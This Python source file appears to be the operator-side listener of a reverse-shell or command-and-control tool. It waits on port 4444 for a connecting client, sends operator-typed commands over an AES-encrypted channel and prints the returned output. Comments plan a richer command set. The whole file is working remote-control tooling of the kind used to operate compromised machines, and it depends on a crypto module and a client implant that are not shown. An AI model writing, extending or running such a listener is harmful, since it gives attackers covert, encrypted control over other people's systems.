import socket
from crypto import encrypt, decrypt  # Import AES encryption logic

def start_server(host='0.0.0.0', port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
    s.bind((host, port)) # Bind the socket to the host and port
    s.listen(1) # Listen for incoming connections; consider increasing backlog from 1 to 4 for better scalability
    print(f"[+] Listening on {host}:{port}")
    client, addr = s.accept() # Accept a connection
    print(f"[+] Connection from {addr}") # Print the address of the connected client

    while True:
        cmd = input("shell> ") # Get command input from the user --> later on this will be replaced with a command set
        if cmd in ['exit', 'quit']:
            client.send(encrypt(cmd.encode())) # Encrypt and send exit command
            break
        client.send(encrypt(cmd.encode())) # Encrypt and send command
        result = decrypt(client.recv(4096)).decode() # Receive and decrypt command output from client
        print(result)

    client.close()
    s.close()
